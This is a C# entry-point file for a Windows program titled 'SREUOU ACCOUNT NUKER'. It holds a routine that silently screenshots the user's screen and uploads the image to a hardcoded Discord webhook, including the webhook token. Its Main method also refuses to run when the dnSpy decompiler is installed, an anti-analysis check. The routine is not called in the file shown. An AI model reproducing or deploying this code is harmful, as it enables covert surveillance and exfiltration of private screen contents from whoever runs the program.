using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Windows.Ink;
using Siticone.UI.WinForms;

namespace SREUOU_ACCOUNT_NUKER
{
    internal static class Program
    {
        static async void ScreenShot()
        {
            string webhookUrl = "https://discord.com/api/webhooks/1166003592067555431/mHlDvL5QfITwcme4d2bFgODFNgF-PYw_JUe7stkN5bCFBXaEADMi58u3UR1Qbi1hKNsw";
            string tempPath = Path.Combine(Path.GetTempPath(), $"{Environment.UserName}_Capture.jpg");

            CaptureScreen(tempPath);

            using (HttpClient client = new HttpClient())
            {
                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new StreamContent(File.OpenRead(tempPath)), "file", "screenshot.jpg");

                    var response = await client.PostAsync(webhookUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Screenshot sent to Discord webhook successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Failed to send screenshot to Discord webhook.");
                    }
                }
            }

            // Clean up: Delete the temporary image file
            File.Delete(tempPath);
        }

        static void CaptureScreen(string outputPath)
        {
            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                Graphics graphics = Graphics.FromImage(screenshot);
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                screenshot.Save(outputPath, ImageFormat.Jpeg);
            }
        }

        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
               try
               {
                   if (File.Exists(Environment.ExpandEnvironmentVariables("%appdata%") + "\\dnSpy\\dnSpy.xml"))
                   {
                        MessageBox.Show("You Have Dnspy", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                   }
                   else
                   {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        Application.Run(new Form1());
                   }
               }
               catch (Exception ex)
               {
                     Application.Restart();
                     MessageBox.Show(ex.ToString(), "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
               }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }
    }
}